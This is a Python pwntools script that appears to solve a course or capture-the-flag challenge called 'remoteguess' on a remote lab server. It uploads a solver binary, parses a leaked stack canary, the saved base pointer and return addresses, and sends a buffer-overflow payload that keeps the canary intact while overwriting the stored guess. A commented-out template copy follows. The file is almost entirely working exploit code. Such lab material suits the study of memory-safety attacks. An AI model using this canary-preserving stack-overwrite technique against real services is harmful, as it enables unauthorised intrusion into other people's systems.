#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Import necessary libraries
import os
import sys
import pow as pw
from pwn import *

# Set the architecture and operating system for the binary to be executed
context.arch = 'amd64'
context.os = 'linux'

# Determine the executable to be used (local or remote)
exe = "./solver" if len(sys.argv) < 2 else sys.argv[1]

# Read in the payload from the executable
payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# Connect to the server
# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

# Solve the proof-of-work challenge (if any)
if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# If a payload is provided, send it to the server
if payload != None:
    # Load the ELF file
    ef = ELF(exe)
    # Print information about the payload
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    # Send the payload to the server
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)

    # Extract information about the stack from the server's response
    r.readuntil(b'canary\n')
    canary = int(r.readline().decode().split('\n')[0], 16)
    r.readuntil(b'main_rbp\n')
    main_rbp = int(r.readline().decode().split('\n')[0], 16)
    r.readuntil(b'solver_retadr\n')
    solver_retadr = int(r.readline().decode().split('\n')[0], 16)
    r.readuntil(b'guess_retadr\n')
    guess_retadr = int(r.readline().decode().split('\n')[0], 16)

    # Print information about the extracted stack information
    print(f'canary = {hex(canary)}')
    print(f'main_rbp = {hex(main_rbp)}')
    print(f'solver_retadr = {hex(solver_retadr)}')
    print(f'guess_retadr = {hex(guess_retadr)}')

    # Set the guess to be sent to the server
    myguess = 1234
    # Construct the payload for the guess
    r.sendlineafter(b'answer? ', str(myguess).encode('ascii').ljust(0x10, b'\0') + b'\0' * 8 +
                    p64(canary) + p64(main_rbp) + p64(guess_retadr) + b'\0' * 12 + p32(myguess))
    # print都是拿來debug的，主要是用sendlineafter將答案放入server stdin
    print(str(myguess).encode('ascii').ljust(0x10, b'\0') + b'\0' * 8 +
          p64(canary) + p64(main_rbp) + p64(guess_retadr) + b'\0' * 12 + p32(myguess))

# If no payload is provided, simply send 0 to the server
else:
    r.sendlineafter(b'send to me? ', b'0')

# Interact with the server
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :





# #!/usr/bin/env python3
# # -*- coding: utf-8 -*-

# import os
# import sys
# import pow as pw
# from pwn import *

# context.arch = 'amd64'
# context.os = 'linux'

# exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

# payload = None
# if os.path.exists(exe):
#     with open(exe, 'rb') as f:
#         payload = f.read()

# #r = process("./remoteguess", shell=True)
# #r = remote("localhost", 10816)
# r = remote("up23.zoolab.org", 10816)

# if type(r) != pwnlib.tubes.process.process:
#     pw.solve_pow(r)

# if payload != None:
#     ef = ELF(exe)
#     print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
#     r.sendlineafter(b'send to me? ', str(len(payload)).encode())
#     r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
#     r.sendafter(b'bytes): ', payload)
# else:
#     r.sendlineafter(b'send to me? ', b'0')

# r.interactive()

# # vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
